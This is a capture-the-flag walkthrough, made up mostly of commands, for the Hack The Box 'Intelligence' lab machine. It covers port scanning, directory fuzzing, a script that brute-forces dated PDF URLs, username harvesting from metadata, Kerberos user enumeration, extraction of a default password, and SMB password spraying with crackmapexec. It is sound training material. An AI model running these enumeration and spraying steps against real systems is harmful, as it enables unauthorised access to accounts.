```
nmap -sS -sC -sV -T5 -Pn 10.10.10.248
```
![image](https://github.com/regarmulia/HTB/assets/33616880/6413486e-f42a-43a5-b969-237d18b6e161)

```
ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words-lowercase.txt -u http://10.10.10.248/FUZZ -e .aspx,.php,.txt,.html,.sh
```
![image](https://github.com/regarmulia/HTB/assets/33616880/96991ceb-dfba-48ae-a7ad-6399ba07a2ed)

```
wget http://10.10.10.248/documents/2020-01-01-upload.pdf
```
![image](https://github.com/regarmulia/HTB/assets/33616880/bdc6e7f4-18d2-448d-95b8-1531c66d373e)

```
exiftool 2020-01-01-upload.pdf
```
![image](https://github.com/regarmulia/HTB/assets/33616880/44a19195-37c8-4deb-b3ed-b2c660206718)

```
curl http://10.10.10.248/documents/2020-01-01-upload.pdf --output 2020-01-01-upload.pdf
```
![image](https://github.com/regarmulia/HTB/assets/33616880/b57f601a-2f11-4db5-ac20-830bd9527e7f)

```
wget https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_linux_amd64
chmod +x kerbrute_linux_amd64
./kerbrute_linux_amd64 userenum --dc 10.10.10.248 -d intelligence.htb users
```
![image](https://github.com/regarmulia/HTB/assets/33616880/4efd407f-9ea1-4de4-9387-ba3ea918ac6d)

```
#!/usr/bin/env python3

import datetime
import requests


t = datetime.datetime(2020, 1, 1)  
end = datetime.datetime(2021, 7, 4) 

while True:
    url = t.strftime("http://intelligence.htb/documents/%Y-%m-%d-upload.pdf")  
    resp = requests.get(url)
    if resp.status_code == 200:
        print(url)
    t = t + datetime.timedelta(days=1)
    if t >= end:
        break
```
```
python3 findpdfs.py
```
![image](https://github.com/regarmulia/HTB/assets/33616880/0a43ff18-7da3-413d-8e83-ef4b8c33c978)

![image](https://github.com/regarmulia/HTB/assets/33616880/5cef87be-c746-4a4f-87d4-f5d4d5f95f63)

```
wget -i pdfsurl
```
![image](https://github.com/regarmulia/HTB/assets/33616880/5def43cf-a8a4-43a7-b66b-9ba62c4fb63d)

```
exiftool *upload.pdf | grep Creator | sort –u
exiftool *upload.pdf | grep Creator | awk -F': ' '{print $2}' | sort -u
```
![image](https://github.com/regarmulia/HTB/assets/33616880/c455f320-d1a8-4227-8fb2-c7a237733da9)

![image](https://github.com/regarmulia/HTB/assets/33616880/447f7d52-ef55-4f5b-9ef1-97e4df35eca7)

```
for f in *pdf; do pdftotext $f; done
```
![image](https://github.com/regarmulia/HTB/assets/33616880/9ed0481f-90bf-425a-b359-7ec3b702c948)

```
head -n1 *txt
NewIntelligenceCorpUser9876
```
![image](https://github.com/regarmulia/HTB/assets/33616880/7470bba3-1f65-4360-90db-2d353f91365c)

![image](https://github.com/regarmulia/HTB/assets/33616880/1274008a-d8b3-475d-acb1-af86b0b1f8b4)

```
cat *txt > all.txt
nano all.txt; ctrl+w password
```
![image](https://github.com/regarmulia/HTB/assets/33616880/20edb4ef-02e1-4a33-9a2f-9386d399c602)

```
crackmapexec smb 10.10.10.248 -u users -p NewIntelligenceCorpUser9876
```
![image](https://github.com/regarmulia/HTB/assets/33616880/af9cb0b4-8e06-42ea-96e3-366f913af48a)
